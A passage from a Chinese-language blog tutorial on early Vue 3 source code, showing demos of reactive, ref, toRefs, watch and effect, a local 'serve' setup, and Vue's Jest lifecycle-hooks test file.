<li>packages/vue目录中是用于构建「完整构建」版本，引用了runtime 和 compiler。我们就可以直接使用其特性了。<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; reactive &#125; = Vue</span><br><span class="line"><span class="keyword">var</span> App = &#123;</span><br><span class="line">  template: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;div class="container"&gt;</span></span><br><span class="line"><span class="string">         &#123;&#123;msg&#125;&#125;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;`</span>,</span><br><span class="line">  setup() &#123;</span><br><span class="line">  	<span class="keyword">const</span> state = reactive(&#123;<span class="attr">msg</span>: <span class="string">"Hello World!!!"</span>&#125;)</span><br><span class="line">	<span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Vue.createApp().mount(App, <span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/images/Vue34.png" alt="My Pic"></p>
<blockquote>
<p>这个例子里面可能reactive和setup大家还不是很熟悉。从名字就可以看出reactive把对象变为响应式的方法，和之前我们写在data中的数据一样，Vue3中同样也支持data的写法。<br>setup实际上也是一个生命周期函数等价于beforeCreate和created</p>
</blockquote>
<ul>
<li>为了更加方便的编写demo调试，我们可以本地起一个服务。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g serve</span><br></pre></td></tr></table></figure>
<blockquote>
<p>然后就可以直接运行 serve 就会在根目录启动服务 在进入相应的demo目录就能看到结果</p>
</blockquote>
<p><img src="/images/Vue35.png" alt="My Pic"></p>
<ul>
<li>接下来我们再看一个例子</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; reactive &#125; = Vue</span><br><span class="line"><span class="keyword">let</span> Input = &#123;</span><br><span class="line">  template: <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;input type="text" v-model="word"/&gt;</span></span><br><span class="line"><span class="string">  `</span>,</span><br><span class="line">  setup(props, context) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(props, context)</span><br><span class="line">    <span class="keyword">const</span> state = reactive(&#123; <span class="attr">word</span>: props.title&#125;)</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> App = &#123;</span><br><span class="line">  template: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;div class="msg"&gt;</span></span><br><span class="line"><span class="string">        &#123;&#123;state.value&#125;&#125;</span></span><br><span class="line"><span class="string">        &lt;Input title="init data" /&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;`</span>,</span><br><span class="line">  components: &#123;</span><br><span class="line">    Input</span><br><span class="line">  &#125;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    <span class="keyword">const</span> state = reactive(&#123; <span class="attr">value</span>: <span class="string">'hello world'</span> &#125;)</span><br><span class="line">    <span class="keyword">return</span> &#123; state &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Vue.createApp().mount(App, <span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/Vue36.png" alt="My Pic"></p>
<blockquote>
<p>这个例子主要是一个父子组件之间的信息传递。可以看到setup方法接受两个参数一个是props（也就是父组件传递的值），另一个是context。</p>
</blockquote>
<ul>
<li>再来看看ref 和 toRefs</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; reactive, ref, computed, onMounted &#125; = Vue</span><br><span class="line"><span class="keyword">let</span> App = &#123;</span><br><span class="line">  template: <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;button @click="increment"&gt;</span></span><br><span class="line"><span class="string">  Count is: &#123;&#123; count &#125;&#125;, double is &#123;&#123; double &#125;&#125;, click to increment.</span></span><br><span class="line"><span class="string">  &lt;/button&gt;`</span>,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'setup'</span>)</span><br><span class="line">    <span class="keyword">const</span> count = ref(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(count)</span><br><span class="line">    <span class="keyword">const</span> double = computed(<span class="function"><span class="params">()</span> =&gt;</span> count.value * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">increment</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      count.value++</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    onMounted(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'component mounted!'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      count,</span><br><span class="line">      double,</span><br><span class="line">      increment</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Vue.createApp().mount(App, <span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/Vue37.gif" alt="My Pic"></p>
<blockquote>
<p>ref可以创建单个的响应式的对象 返回之后可以直接访问。通过打印出的值也可以看到其中包含了一个value键和_isRef键。我们通过reactive创建一个对象也能实现同样的效果。使用ref调用时会更加简单一点。如果使用reactive要想实现同样的效果，就需要使用toRefs将创建的对象拆成单个的响应式对象。</p>
</blockquote>
<ul>
<li>在看看数据双向绑定</li>
</ul>
<blockquote>
<p>我们都知道3中的数据响应使用的代理来实现的。我们来看一个例子吧。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; reactive, watch, effect, toRefs &#125; = Vue</span><br><span class="line"><span class="keyword">let</span> App = &#123;</span><br><span class="line">  template: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;div class="msg"&gt;</span></span><br><span class="line"><span class="string">        count: &#123;&#123;count&#125;&#125;</span></span><br><span class="line"><span class="string">        &lt;button @click="handlerCountAdd"&gt; Click ++ &lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;`</span>,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    <span class="keyword">const</span> state = reactive(&#123; <span class="attr">count</span>: <span class="number">0</span>, <span class="attr">value</span>: <span class="number">1</span> &#125;)</span><br><span class="line">    <span class="keyword">const</span> handlerCountAdd = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      state.count++</span><br><span class="line">      state.value++</span><br><span class="line">    &#125;</span><br><span class="line">    watch(</span><br><span class="line">      () =&gt; state.count,</span><br><span class="line">      val =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'watch'</span>, state.count)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'watch'</span>, state.value)</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line">    effect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'effect'</span>, state.count)</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'effect'</span>, state.value)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> &#123; ...toRefs(state), handlerCountAdd &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Vue.createApp().mount(App, <span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/Vue38.gif" alt="My Pic"></p>
<blockquote>
<p>effect和watch都可以监听到咱们数据的变化,它们的区别是effect 在响应式数据变化的时候就会执行，执行次数根据响应式数据的个数来决定。watch则只会触发一次。</p>
</blockquote>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote>
<p>我们在源码的功能目录可看到每个功能文件夹下面都对应着一个<strong>test</strong>文件夹里面就是写的一些测试用例。这里使用的Jest测试框架来进行测试的，相应的测试方法参数可以参考官网<a href="https://jestjs.io/" target="_blank" rel="noopener">Jest</a></p>
<p><img src="/images/Vue39.png" alt="My Pic"></p>
<p>可以在命令行中直接运行npm run test 就可以对整个pakeage目录中的测试文件进行测试。可以看到测试通过和失败的个数。</p>
</blockquote>
<p><img src="/images/Vue310.png" alt="My Pic"></p>
<ul>
<li>我们如何测试单个文件呢？ 这就需要修改jest.config.js，将<br>testRegex设置为我们想要测试的文件<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  onBeforeMount,</span><br><span class="line">  h,</span><br><span class="line">  nodeOps,</span><br><span class="line">  render,</span><br><span class="line">  serializeInner,</span><br><span class="line">  onMounted,</span><br><span class="line">  ref,</span><br><span class="line">  onBeforeUpdate,</span><br><span class="line">  nextTick,</span><br><span class="line">  onUpdated,</span><br><span class="line">  onBeforeUnmount,</span><br><span class="line">  onUnmounted,</span><br><span class="line">  onRenderTracked,</span><br><span class="line">  reactive,</span><br><span class="line">  TrackOpTypes,</span><br><span class="line">  onRenderTriggered</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">'@vue/runtime-test'</span></span><br><span class="line"><span class="keyword">import</span> &#123; ITERATE_KEY, DebuggerEvent, TriggerOpTypes &#125; <span class="keyword">from</span> <span class="string">'@vue/reactivity'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// reference: https://vue-composition-api-rfc.netlify.com/api.html#lifecycle-hooks</span></span><br><span class="line"></span><br><span class="line">describe(<span class="string">'api: lifecycle hooks'</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  it(<span class="string">'onBeforeMount'</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> root = nodeOps.createElement(<span class="string">'div'</span>)</span><br><span class="line">    <span class="keyword">const</span> fn = jest.fn(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// should be called before inner div is rendered</span></span><br><span class="line">      expect(serializeInner(root)).toBe(<span class="string">``</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Comp = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        onBeforeMount(fn)</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> h(<span class="string">'div'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    render(h(Comp), root)</span><br><span class="line">    expect(fn).toHaveBeenCalledTimes(<span class="number">1</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'onMounted'</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> root = nodeOps.createElement(<span class="string">'div'</span>)</span><br><span class="line">    <span class="keyword">const</span> fn = jest.fn(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// should be called after inner div is rendered</span></span><br><span class="line">      expect(serializeInner(root)).toBe(<span class="string">`&lt;div&gt;&lt;/div&gt;`</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Comp = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        onMounted(fn)</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> h(<span class="string">'div'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    render(h(Comp), root)</span><br><span class="line">    expect(fn).toHaveBeenCalledTimes(<span class="number">1</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'onBeforeUpdate'</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> count = ref(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">const</span> root = nodeOps.createElement(<span class="string">'div'</span>)</span><br><span class="line">    <span class="keyword">const</span> fn = jest.fn(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// should be called before inner div is updated</span></span><br><span class="line">      expect(serializeInner(root)).toBe(<span class="string">`&lt;div&gt;0&lt;/div&gt;`</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Comp = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        onBeforeUpdate(fn)</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> h(<span class="string">'div'</span>, count.value)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    render(h(Comp), root)</span><br><span class="line"></span><br><span class="line">    count.value++</span><br><span class="line">    <span class="keyword">await</span> nextTick()</span><br><span class="line">    expect(fn).toHaveBeenCalledTimes(<span class="number">1</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'onUpdated'</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> count = ref(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">const</span> root = nodeOps.createElement(<span class="string">'div'</span>)</span><br><span class="line">    <span class="keyword">const</span> fn = jest.fn(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// should be called after inner div is updated</span></span><br><span class="line">      expect(serializeInner(root)).toBe(<span class="string">`&lt;div&gt;1&lt;/div&gt;`</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Comp = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        onUpdated(fn)</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> h(<span class="string">'div'</span>, count.value)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    render(h(Comp), root)</span><br><span class="line"></span><br><span class="line">    count.value++</span><br><span class="line">    <span class="keyword">await</span> nextTick()</span><br><span class="line">    expect(fn).toHaveBeenCalledTimes(<span class="number">1</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'onBeforeUnmount'</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> toggle = ref(<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">const</span> root = nodeOps.createElement(<span class="string">'div'</span>)</span><br><span class="line">    <span class="keyword">const</span> fn = jest.fn(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// should be called before inner div is removed</span></span><br><span class="line">      expect(serializeInner(root)).toBe(<span class="string">`&lt;div&gt;&lt;/div&gt;`</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Comp = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> (toggle.value ? h(Child) : <span class="literal">null</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Child = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        onBeforeUnmount(fn)</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> h(<span class="string">'div'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render(h(Comp), root)</span><br><span class="line"></span><br><span class="line">    toggle.value = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">await</span> nextTick()</span><br><span class="line">    expect(fn).toHaveBeenCalledTimes(<span class="number">1</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'onUnmounted'</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> toggle = ref(<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">const</span> root = nodeOps.createElement(<span class="string">'div'</span>)</span><br><span class="line">    <span class="keyword">const</span> fn = jest.fn(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// should be called after inner div is removed</span></span><br><span class="line">      expect(serializeInner(root)).toBe(<span class="string">`&lt;!----&gt;`</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Comp = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> (toggle.value ? h(Child) : <span class="literal">null</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Child = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        onUnmounted(fn)</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> h(<span class="string">'div'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render(h(Comp), root)</span><br><span class="line"></span><br><span class="line">    toggle.value = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">await</span> nextTick()</span><br><span class="line">    expect(fn).toHaveBeenCalledTimes(<span class="number">1</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'onBeforeUnmount in onMounted'</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> toggle = ref(<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">const</span> root = nodeOps.createElement(<span class="string">'div'</span>)</span><br><span class="line">    <span class="keyword">const</span> fn = jest.fn(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// should be called before inner div is removed</span></span><br><span class="line">      expect(serializeInner(root)).toBe(<span class="string">`&lt;div&gt;&lt;/div&gt;`</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Comp = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> (toggle.value ? h(Child) : <span class="literal">null</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Child = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        onMounted(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">          onBeforeUnmount(fn)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> h(<span class="string">'div'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render(h(Comp), root)</span><br><span class="line"></span><br><span class="line">    toggle.value = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">await</span> nextTick()</span><br><span class="line">    expect(fn).toHaveBeenCalledTimes(<span class="number">1</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'lifecycle call order'</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> count = ref(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">const</span> root = nodeOps.createElement(<span class="string">'div'</span>)</span><br><span class="line">    <span class="keyword">const</span> calls: <span class="built_in">string</span>[] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Root = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        onBeforeMount(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'root onBeforeMount'</span>))</span><br><span class="line">        onMounted(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'root onMounted'</span>))</span><br><span class="line">        onBeforeUpdate(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'root onBeforeUpdate'</span>))</span><br><span class="line">        onUpdated(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'root onUpdated'</span>))</span><br><span class="line">        onBeforeUnmount(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'root onBeforeUnmount'</span>))</span><br><span class="line">        onUnmounted(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'root onUnmounted'</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> h(Mid, &#123; count: count.value &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Mid = &#123;</span><br><span class="line">      setup(props: <span class="built_in">any</span>) &#123;</span><br><span class="line">        onBeforeMount(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'mid onBeforeMount'</span>))</span><br><span class="line">        onMounted(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'mid onMounted'</span>))</span><br><span class="line">        onBeforeUpdate(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'mid onBeforeUpdate'</span>))</span><br><span class="line">        onUpdated(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'mid onUpdated'</span>))</span><br><span class="line">        onBeforeUnmount(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'mid onBeforeUnmount'</span>))</span><br><span class="line">        onUnmounted(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'mid onUnmounted'</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> h(Child, &#123; count: props.count &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Child = &#123;</span><br><span class="line">      setup(props: <span class="built_in">any</span>) &#123;</span><br><span class="line">        onBeforeMount(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'child onBeforeMount'</span>))</span><br><span class="line">        onMounted(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'child onMounted'</span>))</span><br><span class="line">        onBeforeUpdate(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'child onBeforeUpdate'</span>))</span><br><span class="line">        onUpdated(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'child onUpdated'</span>))</span><br><span class="line">        onBeforeUnmount(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'child onBeforeUnmount'</span>))</span><br><span class="line">        onUnmounted(<span class="function"><span class="params">()</span> =&gt;</span> calls.push(<span class="string">'child onUnmounted'</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> h(<span class="string">'div'</span>, props.count)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mount</span></span><br><span class="line">    render(h(Root), root)</span><br><span class="line">    expect(calls).toEqual([</span><br><span class="line">      <span class="string">'root onBeforeMount'</span>,</span><br><span class="line">      <span class="string">'mid onBeforeMount'</span>,</span><br><span class="line">      <span class="string">'child onBeforeMount'</span>,</span><br><span class="line">      <span class="string">'child onMounted'</span>,</span><br><span class="line">      <span class="string">'mid onMounted'</span>,</span><br><span class="line">      <span class="string">'root onMounted'</span></span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    calls.length = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// update</span></span><br><span class="line">    count.value++</span><br><span class="line">    <span class="keyword">await</span> nextTick()</span><br><span class="line">    expect(calls).toEqual([</span><br><span class="line">      <span class="string">'root onBeforeUpdate'</span>,</span><br><span class="line">      <span class="string">'mid onBeforeUpdate'</span>,</span><br><span class="line">      <span class="string">'child onBeforeUpdate'</span>,</span><br><span class="line">      <span class="string">'child onUpdated'</span>,</span><br><span class="line">      <span class="string">'mid onUpdated'</span>,</span><br><span class="line">      <span class="string">'root onUpdated'</span></span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    calls.length = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// unmount</span></span><br><span class="line">    render(<span class="literal">null</span>, root)</span><br><span class="line">    expect(calls).toEqual([</span><br><span class="line">      <span class="string">'root onBeforeUnmount'</span>,</span><br><span class="line">      <span class="string">'mid onBeforeUnmount'</span>,</span><br><span class="line">      <span class="string">'child onBeforeUnmount'</span>,</span><br><span class="line">      <span class="string">'child onUnmounted'</span>,</span><br><span class="line">      <span class="string">'mid onUnmounted'</span>,</span><br><span class="line">      <span class="string">'root onUnmounted'</span></span><br><span class="line">    ])</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'onRenderTracked'</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> events: DebuggerEvent[] = []</span><br><span class="line">    <span class="keyword">const</span> onTrack = jest.fn(<span class="function">(<span class="params">e: DebuggerEvent</span>) =&gt;</span> &#123;</span><br><span class="line">      events.push(e)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">const</span> obj = reactive(&#123; foo: <span class="number">1</span>, bar: <span class="number">2</span> &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Comp = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        onRenderTracked(onTrack)</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span></span><br><span class="line">          h(<span class="string">'div'</span>, [obj.foo, <span class="string">'bar'</span> <span class="keyword">in</span> obj, <span class="built_in">Object</span>.keys(obj).join(<span class="string">''</span>)])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render(h(Comp), nodeOps.createElement(<span class="string">'div'</span>))</span><br><span class="line">    expect(onTrack).toHaveBeenCalledTimes(<span class="number">3</span>)</span><br><span class="line">    expect(events).toMatchObject([</span><br><span class="line">      &#123;</span><br><span class="line">        target: obj,</span><br><span class="line">        <span class="keyword">type</span>: TrackOpTypes.GET,</span><br><span class="line">        key: <span class="string">'foo'</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        target: obj,</span><br><span class="line">        <span class="keyword">type</span>: TrackOpTypes.HAS,</span><br><span class="line">        key: <span class="string">'bar'</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        target: obj,</span><br><span class="line">        <span class="keyword">type</span>: TrackOpTypes.ITERATE,</span><br><span class="line">        key: ITERATE_KEY</span><br><span class="line">      &#125;</span><br><span class="line">    ])</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'onRenderTriggered'</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> events: DebuggerEvent[] = []</span><br><span class="line">    <span class="keyword">const</span> onTrigger = jest.fn(<span class="function">(<span class="params">e: DebuggerEvent</span>) =&gt;</span> &#123;</span><br><span class="line">      events.push(e)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">const</span> obj = reactive(&#123; foo: <span class="number">1</span>, bar: <span class="number">2</span> &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Comp = &#123;</span><br><span class="line">      setup() &#123;</span><br><span class="line">        onRenderTriggered(onTrigger)</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span></span><br><span class="line">          h(<span class="string">'div'</span>, [obj.foo, <span class="string">'bar'</span> <span class="keyword">in</span> obj, <span class="built_in">Object</span>.keys(obj).join(<span class="string">''</span>)])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render(h(Comp), nodeOps.createElement(<span class="string">'div'</span>))</span><br><span class="line"></span><br><span class="line">    obj.foo++</span><br><span class="line">    <span class="keyword">await</span> nextTick()</span><br><span class="line">    expect(onTrigger).toHaveBeenCalledTimes(<span class="number">1</span>)</span><br><span class="line">    expect(events[<span class="number">0</span>]).toMatchObject(&#123;</span><br><span class="line">      <span class="keyword">type</span>: TriggerOpTypes.SET,</span><br><span class="line">      key: <span class="string">'foo'</span>,</span><br><span class="line">      oldValue: <span class="number">1</span>,</span><br><span class="line">      newValue: <span class="number">2</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> obj.bar</span><br><span class="line">    <span class="keyword">await</span> nextTick()</span><br><span class="line">    expect(onTrigger).toHaveBeenCalledTimes(<span class="number">2</span>)</span><br><span class="line">    expect(events[<span class="number">1</span>]).toMatchObject(&#123;</span><br><span class="line">      <span class="keyword">type</span>: TriggerOpTypes.DELETE,</span><br><span class="line">      key: <span class="string">'bar'</span>,</span><br><span class="line">      oldValue: <span class="number">2</span></span><br><span class="line">    &#125;)</span><br><span class="line">    ;(obj <span class="keyword">as</span> <span class="built_in">any</span>).baz = <span class="number">3</span></span><br><span class="line">    <span class="keyword">await</span> nextTick()</span><br><span class="line">    expect(onTrigger).toHaveBeenCalledTimes(<span class="number">3</span>)</span><br><span class="line">    expect(events[<span class="number">2</span>]).toMatchObject(&#123;</span><br><span class="line">      <span class="keyword">type</span>: TriggerOpTypes.ADD,</span><br><span class="line">      key: <span class="string">'baz'</span>,</span><br><span class="line">      newValue: <span class="number">3</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>再次运行npm run test</p>
<p><img src="/images/Vue311.png" alt="My Pic"></p>
<p>这里可以看到我们编写的测试用例的名称，以及是否通过。</p>
</blockquote>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
